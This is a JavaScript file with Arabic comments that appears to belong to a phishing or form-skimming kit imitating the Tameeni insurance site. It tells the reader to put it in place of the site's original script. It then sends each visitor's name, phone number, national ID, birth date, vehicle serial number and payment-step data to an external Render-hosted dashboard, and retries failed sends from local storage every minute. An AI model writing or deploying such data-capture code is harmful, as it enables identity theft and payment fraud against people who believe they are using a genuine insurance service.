/**
 * ملف التكامل مع موقع تأميني
 * استبدل هذا الملف بالسكريبت الأصلي في موقعك لإرسال البيانات إلى لوحة التحكم
 */

// إعدادات لوحة التحكم
const DASHBOARD_CONFIG = {
    // رابط لوحة التحكم على Render (استبدل هذا بالرابط الفعلي)
    dashboardUrl: 'https://tameeni-dashboard.onrender.com',
    
    // إعدادات تخزين البيانات
    storage: 'localStorage', // أو 'sessionStorage'
    
    // إعدادات الإشعارات
    notifications: true,
    
    // إعدادات بريد إلكتروني اختيارية
    emailNotifications: false,
    emailAddress: 'admin@yourcompany.com',
    
    // إعدادات Render.com
    useRenderAPI: true, // إرسال البيانات لـ Render API
    renderEndpoint: 'https://tameeni-dashboard.onrender.com/api/receive-data'
};

/**
 * دالة إرسال بيانات الخطوة الأولى إلى لوحة التحكم
 */
async function sendToDashboardStep1(data) {
    try {
        // إعداد البيانات للإرسال
        const requestData = {
            step: 1,
            stepName: 'البيانات الأساسية',
            userName: data.userName,
            phoneNumber: data.phoneNumber,
            offerType: data.offerType,
            regType: data.regType,
            idNumber: data.idNumber,
            birthDate: data.birthDate || null,
            serialNumber: data.serialNumber,
            carYear: data.carYear || null,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageUrl: window.location.href
        };

        // إرسال البيانات إلى لوحة التحكم
        const result = await sendToDashboard(requestData);
        
        if (result.success) {
            console.log('تم إرسال بيانات الخطوة الأولى إلى لوحة التحكم بنجاح');
            
            // إظهار إشعار نجاح اختياري
            if (DASHBOARD_CONFIG.notifications) {
                showNotification('تم حفظ بياناتك بنجاح', 'success');
            }
            
            return true;
        } else {
            throw new Error(result.message || 'فشل في إرسال البيانات');
        }
        
    } catch (error) {
        console.error('خطأ في إرسال البيانات إلى لوحة التحكم:', error);
        
        // إظهار إشعار خطأ اختياري
        if (DASHBOARD_CONFIG.notifications) {
            showNotification('حدث خطأ في حفظ البيانات', 'error');
        }
        
        return false;
    }
}

/**
 * دالة إرسال بيانات الخطوة الثانية إلى لوحة التحكم
 */
async function sendToDashboardStep2(data) {
    try {
        const requestData = {
            step: 2,
            stepName: 'بيانات التأمين',
            ...data,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageUrl: window.location.href
        };

        const result = await sendToDashboard(requestData);
        
        if (result.success) {
            console.log('تم إرسال بيانات الخطوة الثانية إلى لوحة التحكم بنجاح');
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('خطأ في إرسال بيانات الخطوة الثانية:', error);
        return false;
    }
}

/**
 * دالة إرسال بيانات الخطوة الثالثة إلى لوحة التحكم
 */
async function sendToDashboardStep3(data) {
    try {
        const requestData = {
            step: 3,
            stepName: 'قائمة الأسعار',
            ...data,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageUrl: window.location.href
        };

        const result = await sendToDashboard(requestData);
        
        if (result.success) {
            console.log('تم إرسال بيانات الخطوة الثالثة إلى لوحة التحكم بنجاح');
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('خطأ في إرسال بيانات الخطوة الثالثة:', error);
        return false;
    }
}

/**
 * دالة إرسال بيانات الخطوة الرابعة إلى لوحة التحكم
 */
async function sendToDashboardStep4(data) {
    try {
        const requestData = {
            step: 4,
            stepName: 'الإضافات',
            ...data,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageUrl: window.location.href
        };

        const result = await sendToDashboard(requestData);
        
        if (result.success) {
            console.log('تم إرسال بيانات الخطوة الرابعة إلى لوحة التحكم بنجاح');
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('خطأ في إرسال بيانات الخطوة الرابعة:', error);
        return false;
    }
}

/**
 * دالة إرسال بيانات الخطوة الخامسة إلى لوحة التحكم
 */
async function sendToDashboardStep5(data) {
    try {
        const requestData = {
            step: 5,
            stepName: 'الملخص والدفع',
            ...data,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageUrl: window.location.href,
            completed: true
        };

        const result = await sendToDashboard(requestData);
        
        if (result.success) {
            console.log('تم إرسال بيانات الخطوة الخامسة إلى لوحة التحكم بنجاح');
            
            // إرسال إشعار إتمام العملية
            if (DASHBOARD_CONFIG.notifications) {
                showNotification('تم إكمال طلب التأمين بنجاح!', 'success');
            }
            
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('خطأ في إرسال بيانات الخطوة الخامسة:', error);
        return false;
    }
}

/**
 * دالة إرسال البيانات الأساسية إلى لوحة التحكم
 */
async function sendToDashboard(data) {
    try {
        // استخدام API لوحة التحكم إذا كانت متاحة
        if (window.parent && window.parent.InsuranceDashboardAPI) {
            return window.parent.InsuranceDashboardAPI.addRequest(data);
        }
        
        // أو استخدام التخزين المحلي إذا كانت في نفس النافذة
        if (window.InsuranceDashboardAPI) {
            return window.InsuranceDashboardAPI.addRequest(data);
        }
        
        // إرسال إلى Render API إذا كان مُفعل
        if (DASHBOARD_CONFIG.useRenderAPI) {
            const renderResult = await sendToRenderAPI(data);
            if (renderResult.success) {
                return renderResult;
            }
        }
        
        // إرسال عبر AJAX كخيار احتياطي
        return await sendViaAjax(data);
        
    } catch (error) {
        console.error('خطأ في إرسال البيانات:', error);
        return { success: false, message: error.message };
    }
}

/**
 * إرسال البيانات عبر AJAX كخيار احتياطي
 */
async function sendViaAjax(data) {
    return new Promise((resolve) => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', DASHBOARD_CONFIG.dashboardUrl + '/api/receive-data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    const response = JSON.parse(xhr.responseText);
                    resolve(response);
                } catch (e) {
                    resolve({ success: true, message: 'تم الحفظ محلياً' });
                }
            } else {
                resolve({ success: false, message: 'فشل في الخادم' });
            }
        };
        
        xhr.onerror = function() {
            // في حالة فشل AJAX، احفظ محلياً
            try {
                localStorage.setItem('pendingRequests', JSON.stringify([
                    ...JSON.parse(localStorage.getItem('pendingRequests') || '[]'),
                    { ...data, id: Date.now(), local: true }
                ]));
                resolve({ success: true, message: 'تم الحفظ محلياً' });
            } catch (e) {
                resolve({ success: false, message: 'فشل في الحفظ' });
            }
        };
        
        xhr.send(JSON.stringify(data));
    });
}

/**
 * إرسال البيانات إلى Render API
 */
async function sendToRenderAPI(data) {
    try {
        const response = await fetch(DASHBOARD_CONFIG.renderEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        if (response.ok) {
            const result = await response.json();
            return result;
        } else {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
    } catch (error) {
        console.error('خطأ في إرسال البيانات إلى Render:', error);
        return { success: false, message: error.message };
    }
}

/**
 * إظهار إشعارات للمستخدم
 */
function showNotification(message, type = 'info') {
    if (!DASHBOARD_CONFIG.notifications) return;
    
    const notification = document.createElement('div');
    notification.className = `dashboard-notification dashboard-notification-${type}`;
    notification.innerHTML = `
        <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
        <span>${message}</span>
        <button class="notification-close" onclick="this.parentElement.remove()">
            <i class="fas fa-times"></i>
        </button>
    `;
    
    // إضافة الأنماط
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 0.5rem;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        z-index: 10000;
        display: flex;
        align-items: center;
        gap: 0.75rem;
        animation: slideInRight 0.3s ease-out;
        max-width: 400px;
        font-family: 'Cairo', sans-serif;
    `;
    
    document.body.appendChild(notification);
    
    // إزالة تلقائية بعد 5 ثوان
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.animation = 'slideOutRight 0.3s ease-in';
            setTimeout(() => {
                if (notification.parentElement) {
                    notification.remove();
                }
            }, 300);
        }
    }, 5000);
}

/**
 * إضافة أنماط CSS للإشعارات
 */
function addNotificationStyles() {
    if (document.getElementById('dashboard-notification-styles')) return;
    
    const style = document.createElement('style');
    style.id = 'dashboard-notification-styles';
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        @keyframes slideOutRight {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(100%);
                opacity: 0;
            }
        }
        
        .dashboard-notification .notification-close {
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            padding: 0.25rem;
            border-radius: 0.25rem;
            opacity: 0.8;
            transition: opacity 0.2s;
        }
        
        .dashboard-notification .notification-close:hover {
            opacity: 1;
            background-color: rgba(255, 255, 255, 0.1);
        }
    `;
    
    document.head.appendChild(style);
}

/**
 * دالة لاستكمال الطلبات المعلقة
 */
function processPendingRequests() {
    const pending = JSON.parse(localStorage.getItem('pendingRequests') || '[]');
    
    if (pending.length === 0) return;
    
    pending.forEach(request => {
        sendToDashboard(request).then(result => {
            if (result.success) {
                console.log('تم إرسال طلب معلق:', request.id);
            }
        });
    });
    
    // مسح الطلبات المعلقة بعد المعالجة
    localStorage.removeItem('pendingRequests');
}

// إضافة الأنماط عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    addNotificationStyles();
    
    // معالجة الطلبات المعلقة كل دقيقة
    setInterval(processPendingRequests, 60000);
});

// تصدير الدوال للاستخدام في الموقع
window.DashboardIntegration = {
    sendStep1: sendToDashboardStep1,
    sendStep2: sendToDashboardStep2,
    sendStep3: sendToDashboardStep3,
    sendStep4: sendToDashboardStep4,
    sendStep5: sendToDashboardStep5,
    showNotification: showNotification,
    config: DASHBOARD_CONFIG
};